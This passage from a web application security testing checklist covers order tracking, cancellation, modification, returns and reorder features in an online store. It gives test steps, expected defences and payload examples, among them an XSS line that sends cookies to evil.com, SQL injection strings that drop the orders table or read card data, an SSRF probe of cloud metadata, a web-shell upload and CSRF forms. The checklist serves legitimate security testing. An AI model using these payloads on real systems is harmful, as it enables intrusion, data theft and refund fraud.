**Test Steps:** 1. Track an order using tracking_id or order_id. 2. Modify the ID to another user's order. 3. Check if tracking information for another user's order is displayed.

**Expected Result:** Application must verify that the requesting user owns the order before displaying tracking details.

**Payload Example:**

```
Change GET /api/orders/track/TRK-1001 to TRK-1002
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ORD-039 — Enumeration of Tracking Numbers
**Test Category:** Information Disclosure (WSTG-INFO-04) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Order Tracking

**Test Steps:** 1. Note the format of tracking numbers. 2. Enumerate sequential or predictable tracking numbers. 3. Check if tracking details are returned for enumerated IDs without proper auth.

**Expected Result:** Application must use non-predictable tracking identifiers and require authentication or ownership verification.

**Payload Example:**

```
Enumerate TRK-00001 to TRK-99999 using Burp Intruder
```

**Impact:** Username/account enumeration -&gt; a valid-target list that fuels credential stuffing / phishing / ATO.

**Tools:** Burp Suite Intruder;ffuf

**References:** CWE-204; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-IDNT-04

---

## ORD-040 — SQL Injection in Tracking Number Search
**Test Category:** Injection (WSTG-INPV-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Order Tracking

**Test Steps:** 1. Enter a tracking number in the search field. 2. Inject SQL payloads in the tracking_id parameter. 3. Observe the response for SQL errors or data extraction.

**Expected Result:** Application must use parameterized queries for tracking number lookups.

**Payload Example:**

```
GET /api/track?tracking_id=' OR 1=1-- or tracking_id=1' UNION SELECT table_name FROM information_schema.tables--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap;Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## ORD-041 — XSS in Tracking Status Display
**Test Category:** Cross-Site Scripting (WSTG-INPV-02) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Order Tracking

**Test Steps:** 1. If tracking status can be updated by seller or admin inject XSS payload in status message. 2. View the tracking page as the buyer. 3. Check if the payload executes.

**Expected Result:** Application must encode all tracking status messages and updates before rendering to prevent XSS.

**Payload Example:**

```
status_message=<script>document.location='https://evil.com/?c='+document.cookie</script>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## ORD-042 — Unauthorized Tracking Status Modification
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Order Tracking

**Test Steps:** 1. As a regular user attempt to send a PUT or PATCH request to update tracking status. 2. Try to change status from shipped to delivered. 3. Check if modification is accepted.

**Expected Result:** Application must restrict tracking status updates to authorized roles only such as admin or logistics personnel.

**Payload Example:**

```
PUT /api/orders/track/TRK-1001 with body status=delivered using regular user token
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ORD-043 — Tracking Page Open Redirect
**Test Category:** Open Redirect (WSTG-CLNT-04) · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Order Tracking

**Test Steps:** 1. Check if the tracking page has any redirect parameters. 2. Modify the redirect URL to an external malicious site. 3. Check if the user is redirected.

**Expected Result:** Application must validate redirect URLs against a whitelist and prevent redirects to external domains.

**Payload Example:**

```
GET /api/track?tracking_id=TRK-1001&redirect=https://evil.com
```

**Impact:** Open redirect -&gt; OAuth code/token theft, credible phishing on the trusted origin.

**Tools:** Burp Suite;Browser

**References:** CWE-601; -&gt;[Open Redirect checklist](#/checklist/openredir); PortSwigger; PayloadsAllTheThings

---

## ORD-044 — SSRF via Tracking Webhook URL
**Test Category:** SSRF (WSTG-INPV-19) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Order Tracking

**Test Steps:** 1. If tracking allows setting webhook or callback URLs for status updates intercept the request. 2. Set URL to internal services. 3. Check for SSRF.

**Expected Result:** Application must validate webhook URLs against allowlists and block internal network addresses.

**Payload Example:**

```
webhook_url=http://127.0.0.1:8080/admin or http://169.254.169.254/latest/meta-data/
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite;Collaborator

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## ORD-045 — Sensitive Location Data Exposure in Tracking
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Order Tracking

**Test Steps:** 1. Access tracking details via API. 2. Check if response includes exact GPS coordinates or detailed courier location or customer's precise address to unauthorized parties.

**Expected Result:** Application must limit location precision based on user role and not expose exact coordinates to unauthorized users.

**Payload Example:**

```
Inspect response for fields like courier_gps_lat; courier_gps_lng; exact_delivery_coordinates
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite;Postman

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## ORD-046 — IDOR on Order Cancellation
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Order Cancellation

**Test Steps:** 1. Initiate order cancellation for own order. 2. Intercept the request and change order_id to another user's order. 3. Submit the cancellation request.

**Expected Result:** Application must verify that the authenticated user owns the order before allowing cancellation.

**Payload Example:**

```
Change POST /api/orders/cancel with order_id=1001 to order_id=1002
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ORD-047 — Cancelling Already Shipped or Delivered Orders
**Test Category:** Business Logic (WSTG-BUSL-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Order Cancellation

**Test Steps:** 1. Identify an order with status shipped or delivered. 2. Attempt to cancel this order via API. 3. Check if cancellation is processed despite invalid state.

**Expected Result:** Application must enforce order state machine rules and prevent cancellation of shipped or delivered orders.

**Payload Example:**

```
POST /api/orders/cancel with order_id of an already-delivered order
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ORD-048 — Race Condition on Cancellation and Shipment
**Test Category:** Business Logic (WSTG-BUSL-08) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Order Cancellation

**Test Steps:** 1. Simultaneously send a cancellation request and a shipment confirmation request for the same order. 2. Check which one succeeds or if both succeed causing an inconsistent state.

**Expected Result:** Application must implement proper locking to prevent simultaneous cancellation and shipment of the same order.

**Payload Example:**

```
Send concurrent POST /api/orders/cancel and POST /api/orders/ship for the same order_id
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Turbo Intruder;Burp Suite

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## ORD-049 — Unauthorized Cancellation by Non-Owner
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Order Cancellation

**Test Steps:** 1. Login as User A. 2. Attempt to cancel an order belonging to User B using User B's order_id. 3. Check if the application allows the cancellation.

**Expected Result:** Application must strictly verify order ownership and deny cancellation requests from non-owners.

**Payload Example:**

```
POST /api/orders/cancel with User B's order_id while authenticated as User A
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ORD-050 — CSRF on Order Cancellation
**Test Category:** CSRF (WSTG-SESS-05) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Order Cancellation

**Test Steps:** 1. Craft a malicious page that auto-submits a cancellation request for the victim's active order. 2. Lure the victim to visit the page. 3. Check if the order is cancelled.

**Expected Result:** Application must validate CSRF tokens on cancellation requests to prevent cross-site forgery.

**Payload Example:**

```
<img src='https://target.com/api/orders/cancel?order_id=1001'> or auto-submit form
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite;Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## ORD-051 — Refund Manipulation During Cancellation
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Order Cancellation

**Test Steps:** 1. Cancel an order and intercept the cancellation request. 2. Modify the refund_amount parameter to a higher value than the original order. 3. Submit and check if excess refund is processed.

**Expected Result:** Application must calculate refund amounts server-side based on the actual order value and not accept client-specified refund amounts.

**Payload Example:**

```
Change refund_amount=50.00 to refund_amount=500.00 in cancellation request
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ORD-052 — Mass Cancellation via API Abuse
**Test Category:** Business Logic (WSTG-BUSL-05) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Order Cancellation

**Test Steps:** 1. Capture the cancellation API endpoint. 2. Script automated requests to cancel multiple orders in bulk. 3. Check if rate limiting or bulk cancellation prevention exists.

**Expected Result:** Application must implement rate limiting and prevent bulk cancellation abuse especially for competitor sabotage scenarios.

**Payload Example:**

```
Script to send POST /api/orders/cancel for order_ids 1001 through 2000
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite Intruder;Custom Scripts

**References:** CWE-840; PortSwigger Business logic

---

## ORD-053 — Cancellation After Refund Already Processed
**Test Category:** Business Logic (WSTG-BUSL-02) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Order Cancellation

**Test Steps:** 1. Cancel an order and receive a refund. 2. Attempt to cancel the same order again. 3. Check if a double refund is issued.

**Expected Result:** Application must track cancellation and refund status to prevent double refund processing.

**Payload Example:**

```
POST /api/orders/cancel for an already-cancelled-and-refunded order_id
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ORD-054 — SQL Injection in Cancellation Reason Field
**Test Category:** Injection (WSTG-INPV-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Order Cancellation

**Test Steps:** 1. Cancel an order and provide a cancellation reason. 2. Inject SQL payload in the reason field. 3. Submit and observe the response.

**Expected Result:** Application must use parameterized queries and sanitize the cancellation reason input.

**Payload Example:**

```
cancellation_reason=test' OR 1=1; DROP TABLE orders;--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap;Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## ORD-055 — Cancellation Bypass via Status Manipulation
**Test Category:** Business Logic (WSTG-BUSL-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Order Cancellation

**Test Steps:** 1. Intercept cancellation request. 2. Modify the order status parameter to allow cancellation of non-cancellable orders. 3. Check if state validation is server-side.

**Expected Result:** Application must validate order state transitions server-side and not trust client-provided status values.

**Payload Example:**

```
Add force_cancel=true or override_status=pending to cancellation request body
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ORD-056 — IDOR on Order Modification
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Order Modification

**Test Steps:** 1. Modify own order details like shipping address or quantity. 2. Intercept the request and change order_id to another user's order. 3. Submit the modification.

**Expected Result:** Application must verify order ownership before allowing any modifications.

**Payload Example:**

```
Change PUT /api/orders/1001/modify to /api/orders/1002/modify
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ORD-057 — Price Manipulation During Modification
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Order Modification

**Test Steps:** 1. Modify an existing order and intercept the request. 2. Change the item price or total_amount parameter. 3. Submit and verify if modified price is accepted.

**Expected Result:** Application must recalculate all prices server-side during order modification and not accept client-provided prices.

**Payload Example:**

```
Change item_price=99.99 to item_price=1.00 in PUT /api/orders/modify body
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ORD-058 — Modifying Order After Cutoff Time
**Test Category:** Business Logic (WSTG-BUSL-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Order Modification

**Test Steps:** 1. Identify an order past the modification window (e.g. already processing or shipped). 2. Attempt to modify it via API. 3. Check if modification is accepted.

**Expected Result:** Application must enforce modification time windows and order state restrictions server-side.

**Payload Example:**

```
PUT /api/orders/modify for an order with status=processing or status=shipped
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ORD-059 — Adding Items to Order Without Paying
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Order Modification

**Test Steps:** 1. Modify an existing order to add additional items. 2. Intercept the request and keep the total amount unchanged. 3. Check if extra items are added without additional payment.

**Expected Result:** Application must recalculate the total after any item additions and require payment for the difference.

**Payload Example:**

```
Add item_id=999 to order items array while keeping total_amount unchanged
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ORD-060 — Unauthorized Order Modification by Non-Owner
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Order Modification

**Test Steps:** 1. As User A attempt to modify User B's order. 2. Use User B's order_id with User A's authentication token. 3. Check if modification is processed.

**Expected Result:** Application must enforce strict ownership checks before processing any order modification.

**Payload Example:**

```
PUT /api/orders/1002/modify with User A's auth token
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ORD-061 — CSRF on Order Modification
**Test Category:** CSRF (WSTG-SESS-05) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Order Modification

**Test Steps:** 1. Craft a malicious page that auto-submits a modification request for the victim's order. 2. Modify shipping address to attacker's address. 3. Check if modification succeeds.

**Expected Result:** Application must validate anti-CSRF tokens on all order modification requests.

**Payload Example:**

```
Auto-submit form changing shipping_address to attacker's address for victim's order_id
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite;Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## ORD-062 — Mass Assignment in Order Modification
**Test Category:** Mass Assignment (WSTG-INPV-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Order Modification

**Test Steps:** 1. Modify an order via API. 2. Add hidden parameters like discount_applied=true or order_status=completed or is_priority=true. 3. Check if unauthorized fields are modified.

**Expected Result:** Application must whitelist modifiable fields and reject any unauthorized parameter changes.

**Payload Example:**

```
Add discount_applied=true&priority=high&admin_override=true to PUT body
```

**Impact:** Mass assignment / parameter pollution -&gt; privilege escalation (role/isAdmin/isVerified) or ownership takeover.

**Tools:** Burp Suite;Postman

**References:** CWE-915; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Mass assignment; OWASP API3 BOPLA

---

## ORD-063 — Race Condition on Modification and Payment
**Test Category:** Business Logic (WSTG-BUSL-08) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Order Modification

**Test Steps:** 1. Simultaneously send a modification request (reducing price) and a payment capture request. 2. Check if payment is captured at original price while order reflects modified lower price.

**Expected Result:** Application must implement atomic transactions to ensure price consistency between modification and payment.

**Payload Example:**

```
Concurrent PUT /api/orders/modify (lower price) and POST /api/payments/capture
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Turbo Intruder;Burp Suite

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## ORD-064 — Quantity Change to Exceed Stock
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Order Modification

**Test Steps:** 1. Modify an order to increase quantity beyond available stock. 2. Intercept request and set quantity to a very high number. 3. Check if overselling is possible via modification.

**Expected Result:** Application must validate stock availability during order modification just as it does during initial placement.

**Payload Example:**

```
Change quantity=1 to quantity=99999 in order modification request
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ORD-065 — IDOR on Return Request
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Return / Exchange Request

**Test Steps:** 1. Submit a return request for own order. 2. Intercept the request and change order_id to another user's order. 3. Check if return is processed for another user's order.

**Expected Result:** Application must verify that the return request is made by the order owner.

**Payload Example:**

```
Change POST /api/returns with order_id=1001 to order_id=1002
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ORD-066 — Returning Already Returned Items
**Test Category:** Business Logic (WSTG-BUSL-02) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Return / Exchange Request

**Test Steps:** 1. Submit a return request for an order that has already been returned. 2. Check if a duplicate return and refund is processed.

**Expected Result:** Application must track return status and prevent duplicate return requests for the same order or item.

**Payload Example:**

```
POST /api/returns for an order_id already in status=returned
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ORD-067 — Return Request After Return Window Expiry
**Test Category:** Business Logic (WSTG-BUSL-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Return / Exchange Request

**Test Steps:** 1. Identify an order past the return window (e.g. 30 days). 2. Attempt to submit a return request via API. 3. Modify date parameters if present. 4. Check if return is accepted.

**Expected Result:** Application must validate return eligibility based on server-side order date and enforce return window policies.

**Payload Example:**

```
POST /api/returns for order placed 60 days ago; tamper order_date or return_window parameters
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ORD-068 — Refund Amount Manipulation on Return
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Return / Exchange Request

**Test Steps:** 1. Submit a return request. 2. Intercept the request and modify refund_amount to a higher value than the item price. 3. Submit and check if inflated refund is processed.

**Expected Result:** Application must calculate refund amounts server-side based on original order data and ignore client-specified amounts.

**Payload Example:**

```
Change refund_amount=25.00 to refund_amount=250.00 in return request
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ORD-069 — Exchange to Higher Value Item Without Paying Difference
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Return / Exchange Request

**Test Steps:** 1. Submit an exchange request replacing a low-value item with a higher-value item. 2. Intercept the request and manipulate the price_difference parameter. 3. Check if exchange processes without additional payment.

**Expected Result:** Application must calculate price differences server-side and require payment for any upgrade.

**Payload Example:**

```
Change price_difference=50.00 to price_difference=0.00 in exchange request
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ORD-070 — SQL Injection in Return Reason Field
**Test Category:** Injection (WSTG-INPV-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Return / Exchange Request

**Test Steps:** 1. Submit a return request. 2. Inject SQL payload in the return_reason field. 3. Submit and observe the response for SQL errors.

**Expected Result:** Application must use parameterized queries and sanitize the return reason input.

**Payload Example:**

```
return_reason=defective' UNION SELECT credit_card FROM payments--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap;Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## ORD-071 — File Upload Vulnerability in Return Evidence
**Test Category:** File Upload (WSTG-INPV-12) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Return / Exchange Request

**Test Steps:** 1. Upload proof images for return request. 2. Upload a malicious file like a web shell renamed as .jpg. 3. Attempt to access the uploaded file and execute it.

**Expected Result:** Application must validate file type by content not extension and store uploads outside web root with no execute permissions.

**Payload Example:**

```
Upload shell.php.jpg or shell.php%00.jpg as return evidence image
```

**Impact:** Malicious file upload -&gt; RCE / stored XSS / parser XXE depending on handling.

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-434; -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger File upload; ImageTragick

---

## ORD-072 — XSS in Return Request Comments
**Test Category:** Cross-Site Scripting (WSTG-INPV-02) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Return / Exchange Request

**Test Steps:** 1. Submit a return request with XSS payload in the comments or reason field. 2. View the return request in admin or customer panel. 3. Check if script executes.

**Expected Result:** Application must sanitize and encode all user-provided text in return requests.

**Payload Example:**

```
return_comments=<img src=x onerror=alert(document.domain)>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## ORD-073 — Returning Items Not in Original Order
**Test Category:** Business Logic (WSTG-BUSL-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Return / Exchange Request

**Test Steps:** 1. Submit a return request. 2. Modify the item_id in the request to an item not part of the original order. 3. Check if the return is processed for the wrong item.

**Expected Result:** Application must validate that returned items belong to the specified order before processing the return.

**Payload Example:**

```
Change item_id=ABC in return request to item_id=XYZ which was not in the order
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ORD-074 — CSRF on Return / Exchange Submission
**Test Category:** CSRF (WSTG-SESS-05) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Return / Exchange Request

**Test Steps:** 1. Craft a malicious page that auto-submits a return request for the victim's order. 2. Have the victim visit the page. 3. Check if the return is submitted.

**Expected Result:** Application must validate CSRF tokens on all return and exchange submission forms.

**Payload Example:**

```
<form action='https://target.com/api/returns' method='POST'><input name='order_id' value='1001'><input name='reason' value='fraud'></form>
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite;Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## ORD-075 — IDOR on Reorder Functionality
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Reorder / Buy Again

**Test Steps:** 1. Use reorder function for own previous order. 2. Intercept request and change order_id to another user's order. 3. Check if items from another user's order are added to your cart.

**Expected Result:** Application must verify order ownership before allowing reorder and only permit reorder of own orders.

**Payload Example:**

```
Change POST /api/orders/reorder with order_id=1001 to order_id=1002
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ORD-076 — Price Discrepancy on Reorder
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Reorder / Buy Again

**Test Steps:** 1. Reorder an item whose price has changed since the original order. 2. Intercept the request and check if the old price is used. 3. Try to force the old price.

**Expected Result:** Application must use current prices for reorders and not the historical price from the original order unless explicitly guaranteed.

**Payload Example:**

```
Check if reorder uses original item_price=10.00 instead of current_price=15.00; tamper to force old price
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ORD-077 — Reordering Discontinued or Out-of-Stock Items
**Test Category:** Business Logic (WSTG-BUSL-02) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Reorder / Buy Again

